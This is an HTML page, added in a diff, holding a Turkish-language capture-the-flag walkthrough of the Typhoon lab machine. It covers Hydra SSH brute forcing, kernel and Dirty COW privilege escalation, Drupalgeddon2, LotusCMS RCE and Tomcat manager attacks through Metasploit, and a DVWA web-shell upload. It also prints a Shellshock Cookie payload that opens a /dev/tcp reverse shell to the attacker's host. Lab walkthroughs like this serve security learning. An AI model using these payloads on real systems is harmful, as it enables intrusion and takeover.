@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,maximum-scale=2">
+    <link rel="stylesheet" type="text/css" media="screen" href="/assets/css/style.css?v=">
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Görkem Özkanat | Deneyelim Bakalım</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Görkem Özkanat" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Deneyelim Bakalım" />
+<meta property="og:description" content="Deneyelim Bakalım" />
+<meta property="og:site_name" content="Görkem Özkanat" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Görkem Özkanat" />
+<script type="application/ld+json">
+{"description":"Deneyelim Bakalım","@type":"WebPage","headline":"Görkem Özkanat","url":"/ctf/typhoon.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          
+
+          <h1 id="project_title">bla bla ve bla</h1>
+          <h2 id="project_tagline">cıks cıks cıks</h2>
+
+          
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <h1 id="nmap-çıktısı">NMAP Çıktısı</h1>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/1.png" alt="Branching" /></p>
+
+<p>ftp’ye baktığımda herhangi bir zafiyet bulamadım. Anonymous olarak giriş yapılabiliyordu fakat faydalı bir şey yoktu.</p>
+
+<h1 id="ssh">SSH</h1>
+
+<p>SSH’a Hydra yardımı ile Brute Force uygulayarak olası bir kullanıcı adı ve parolası bulmaya çalıştım.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-L</span> UserList.txt <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.44.129 <span class="nt">-t</span> 20 <span class="nt">-V</span> ssh
+
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/2.png" alt="Branching" /></p>
+
+<p>SSH ile güzel bir başlangıç yaptık. Bulduğum bilgilerle giriş yapmayı denedim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/3.PNG" alt="Branching" /></p>
+
+<p>uname -a komutu ile sistem bilgilerini çektim ve biraz araştırma yaptığımda yetki yükseltme zafiyetine sahip olduğunu fark ettim. https://www.exploit-db.com/exploits/37292</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/sshuname.png" alt="Branching" /></p>
+
+<p>Bulduğum exploit’i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım ve root yetkisini elde ettim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/ssshexploit.png" alt="Branching" /></p>
+
+<h1 id="http">HTTP</h1>
+
+<p>80 portunda bir Apache server’ı çalıştığını görmüştüm, bir taraftan sayfayı kurcalarken diğer taraftan nikto ve dirb toollarını bilgi toplamaları için çalıştırdım.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dirb http://192.168.44.129 <span class="nt">-o</span> dirb
+
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/4.1.png" alt="Branching" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nikto <span class="nt">-host</span> http://192.168.44.129
+
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/5.png" alt="Branching" /></p>
+
+<p>Nikto çıktısında merak uyandırıcı birkaç bir şey buldum ve shellshock zafiyetini kurcalamaya karar verdim.</p>
+
+<h1 id="shelshock">Shelshock</h1>
+
+<p><strong>Bash, kendisine web uygulaması tarafından yollanan komutları da çalıştırabilmektedir ve shellshock zafiyetinin oluştuğu kısım ise bu özelliğin kötü amaçla kullanılmasıdır.</strong></p>
+
+<p>/cgi-bin/ klasörü altında bulunan dosya üzerinden bu zafiyet istismar edilebilmektedir. Burp Suite yardımıyla araya girerek isteği yakaladım ve backdoor oluşturacak zararlı kodumu Cookie’ye ekleyerek isteği yolladım.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie:<span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.44.128/5555 0&gt;&amp;1
+
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/6.png" alt="Branching" /></p>
+
+<p>5555 portunu dinlemeye başladım. İstismar başarıyla sonuçladı ve shell’i aldım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/7.png" alt="Branching" /></p>
+
+<p>ssh’da kullandığım exploit çalışmadı biraz araştırmayla “Dirty COW” adlı başka bir exploit buldum. Exploit’i kendi makineme indirip derlerken hata aldım fakat kullanılabilir durumdaydı bu yüzden hedef makineye çektim. https://www.exploit-db.com/exploits/40616</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/shellshockgcc.png" alt="Branching" /></p>
+
+<p>Daha sonra exploit’i çalıştırınca root yetkisini elde ettim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/shellshockexploit.png" alt="Branching" /></p>
+
+<h1 id="robottxt-ve-mongodb">robot.txt ve MongoDB</h1>
+
+<p>Web Crawler’ların erişmemesi için robot.txt’ye MongoDB dizini eklendiğini gördüm. Böylece MongoDB dizininden haberim oldu ve dizine gittiğimde bazı yararlı bilgilerle karşılaştım.</p>
+
+<p>robot.txt —&gt; <img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/8.png" alt="Octocat" /></p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/9.png" alt="Branching" /></p>
+
+<p>ıd:typhoon pw:789456123 bilgilerini kullanarak ssh servisi ile bağlandım. Daha önce kullandığım exploit burda da kullanılabilir durumdaydı ve bahsi geçen exploit yardımıyla root yetkisini aldım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/typhoonexploit.png" alt="Branching" /></p>
+
+<h1 id="cms">CMS</h1>
+
+<p>cms dizinine gittiğimde beni böyle bir ekran karşıladı.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/10.png" alt="Branching" /></p>
+
+<p>LotusCMS hakkında biraz araştırma yaptım ve Exploit Database’de bir RCE zaafiyeti olduğunu gördüm.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/11.png" alt="Branching" /></p>
+
+<p>Metasploit Framework kullanarak zafiyeti istismar etmeye çalıştım ve meterpreter session’nı aldım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/12.png" alt="Branching" /></p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/13.png" alt="Branching" /></p>
+
+<p>Daha önceki zafiyetlerde kullandığım exploit’i bu zafiyette de kullanarak root yetkisini elde ettim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/cmsexploityeni.png" alt="Branching" /></p>
+
+<h1 id="drupal">drupal</h1>
+
+<p>drupal dizinine gidip sayfanın kaynağını görüntülediğimde drupal ın drupal 8 olduğunu öğrendim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/17.png" alt="Branching" /></p>
+
+<p>Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile meterpreter session’ı aldım. Daha önce kullandığım exploit burda da işe yaradı ve root yetkisini elde ettim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/drupalexploityeni.png" alt="Branching" /></p>
+
+<h1 id="phpmyadmin">phpMyAdmin</h1>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/14.png" alt="Branching" /></p>
+
+<p>phpMyAdmin dizini beni görseldeki login sayfası ile karşıladı. Burp Suite ile Brute Force yapmayı denedim fakat herhangi bir sonuç alamadım. Bir süre manual olarak ıd pw denedikten sonra ıd:root pw:toor bilgileri ile içeri girebildim. İçerde yok yoktu.</p>
+
+<h1 id="calendar">Calendar</h1>
+
+<p>phpMyAdmin içerisinde calendar için kullanılabilecek id pw buldum fakat calendar’a hiçbir şekilde erişemedim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/15.png" alt="Branching" /></p>
+
+<p><strong>an0ther_fl4g_br0!</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/16.png" alt="Branching" /></p>
+
+<h1 id="dvwa">DVWA</h1>
+
+<p>phpMyAdmin içerisinde Dvwa için kullanılan bazı önemli bilgileri buldum.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/19.png" alt="Branching" /></p>
+
+<p>Bulduğum hash’i decrypt etmek için hashcat kullanmaya çalıştım fakat cevap alamadım. Online bir decrypt sayfasını kullanarak parolayı buldum.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/20.png" alt="Branching" /></p>
+
+<p>Daha sonra DVWA ya girerek Security kısmından güvenlik derecesini Impossible’dan Low’a düşürdüm <em>çünkü neden yapmayayım ki ?</em></p>
+
+<p>Vulnerability : File Upload sekmesine geldim ve bir webshell bularak buradan yükleme işlemini gerçekleştirdim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/21.png" alt="Branching" /></p>
+
+<p>Web shell dosyası içerisinde kendi ip mi ve kendim belirlediğim portu yazdım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/22.png" alt="Branching" /></p>
+
+<p>Belirlediğim portu dinlemeye başladım ve upload gerçekleştikten sonra bize gösterilen endpoint’e giderek shell’i aldım. Daha sonra Shelshock zafiyeti için kullandığım exploit yardımıyla root yetkisine ulaştım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/dvwa.png" alt="Branching" /></p>
+
+<h1 id="apache-tomcatcoyote-jps-engine-11">Apache Tomcat/Coyote JPS engine 1.1</h1>
+
+<p>Metasploit Framework da bulunan tomcat_mgr_login modülü ile 8080 portunda bulunan Tomcat servisinin login bilgilerini almaya çalıştım.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/24.PNG" alt="Branching" /></p>
+
+<p>Bulmuş olduğum tomcat:tomcat bilgisi ile tomcat_mgr_upload modülünü kullanarak meterpreter shell’i elde ettim. Daha sonra privilege escalation için kullandığım exploit ile root yetkisini elde ettim.</p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/tomcatexploit.png" alt="Branching" /></p>
+
+<p><img src="https://raw.githubusercontent.com/gorkemozkanat/gorkemozkanat.github.io/master/assets/images/lastflag.png" alt="Branching" /></p>
+
+<h3 id="teşekkürler-başka-makinelerde-görüşmek-üzere">Teşekkürler, Başka Makinelerde Görüşmek Üzere.</h3>
+
+
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        
+        <p>Published with <a href="https://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+  </body>
+</html>
